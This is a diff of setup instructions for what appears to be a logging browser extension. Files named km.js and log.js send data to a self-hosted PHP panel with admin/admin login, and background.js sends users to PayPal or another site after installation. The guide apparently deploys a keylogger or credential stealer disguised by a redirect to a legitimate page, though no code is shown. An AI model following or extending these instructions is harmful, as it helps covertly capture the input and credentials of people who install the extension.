@@ -31,9 +31,7 @@ Start your wampserver,xhamp ....etc and send the "panel" file to your server
 usernam  = admin
 password = admin
 
-2. yt.php 
-and
-yt2.php
+2. yt.php , yt2.php
 
 If you want : SET YOUR DATETIMEZONE HERE :
 
@@ -44,14 +42,13 @@ if your want to change DATETIMEZONE clique here https://www.php.net/manual/en/ti
 
 # Configuration Extension 
 
-Open the extension folder .
-+ km.js 
-
-and 
-
-+ log.js 
+Open the extension folder 
++ km.js , log.js 
 put the name of your website for exemple `http://127.0.0.1/panel/ 
-and save changes 
+and save changes
+
++ `background.js`
+after installation change my URL github to paypal or another web page
 
 # Installation Extension Chrome / Mozilla Firefox
 + Chrome
@@ -65,6 +62,5 @@ and save changes
 3. click `manifest.json`
 
 # Demo Video Youtube (French version )
-
 https://www.youtube.com/watch?v=Mb6-8u010Xs
 
